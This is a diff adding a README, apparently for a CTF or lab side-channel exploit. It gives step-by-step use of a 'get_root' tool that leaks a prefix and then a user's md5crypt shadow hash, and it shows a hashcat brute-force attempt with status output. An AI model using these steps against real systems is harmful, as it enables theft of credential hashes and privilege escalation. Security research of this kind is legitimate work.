@@ -1,0 +1,51 @@
+# How to Use
+
+## Setup
+
+`make all` in this directory
+
+## Step 1: Leak Prefix
+
+On the vulnerable instance please run:
+
+`taskset -c 1 ./get_root`. As quickly as possible please run `/tmp/set_root_password` in another session. The get_root tool picks up a lot of other random changes to the RDrand relevant region of the LSB so if possible please run this combination a few times until clearly 4 distinct values are presented. That is the prefix we are then interested in.
+
+This prefix should (it's repeated until stable) be the transient bytes.
+
+## Step 2: Leak Hash
+
+Once the `taskset -c 1 get_root` program reaches `Leaking Hash` and waits, please in another session on the same instance run `while true; do taskset -c 5 passwd -S $USER > /dev/null; done;`.
+
+Once the hash is recovered, it is printed in its entirety to the screen, along with a timing readout.
+
+[Unfortunately I didn't have time to properly optimize this so in the good case, i.e. it doesn't hang, it should take about 11 seconds to leak the whole hash. If it does hang, please re-run the program ignore the newly presented prefix.]
+
+## Step 3: Fixed Suffix
+
+I have no idea. I'm able to (semi-reliably depending on my reaction time) get the full prefix needed and can consistently leak the correct shadow md5crypt entry. However I was not able to crack the suffix with hashcat. I could not figure out the invocation. 
+
+My use of `hashcat -a 3 -m 500 test_hash -1 "?l?d" "<recovered prefix>>?1?1?1?1?1?1?1?1?1?1" -d 2` seemed to suggest 58 years of brute forcing on my system.
+
+Example status output:
+
+```
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
+Hash.Target......: $1$MEMxkhJc$vz1vPaGdC077rGshxdOCr/
+Time.Started.....: Fri Dec 12 23:25:49 2025 (31 secs)
+Time.Estimated...: Mon Apr 10 23:32:05 2084 (58 years, 119 days)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: 3ff42f24bbeab3183fe559c0ea45d5c05c6e?1?1?1?1?1?1?1?1?1?1 [46]
+Guess.Charset....: -1 ?l?d, -2 Undefined, -3 Undefined, -4 Undefined 
+Guess.Queue......: 1/1 (100.00%)
+Speed.#2.........:  1986.3 kH/s (12.01ms) @ Accel:64 Loops:250 Thr:32 Vec:1
+Recovered........: 0/1 (0.00%) Digests
+Progress.........: 61423616/3656158440062976 (0.00%)
+Rejected.........: 0/61423616 (0.00%)
+Restore.Point....: 61423616/3656158440062976 (0.00%)
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:250-500
+Candidate.Engine.: Device Generator
+Candidates.#2....: 3ff42f24bbeab3183fe559c0ea45d5c05c6e8rcinittrr -> 3ff42f24bbeab3183fe559c0ea45d5c05c6e3giffeeuse
+Hardware.Mon.#2..: Temp: 71c Fan: 69% Util:100% Core:1890MHz Mem:6801MHz Bus:16
+```
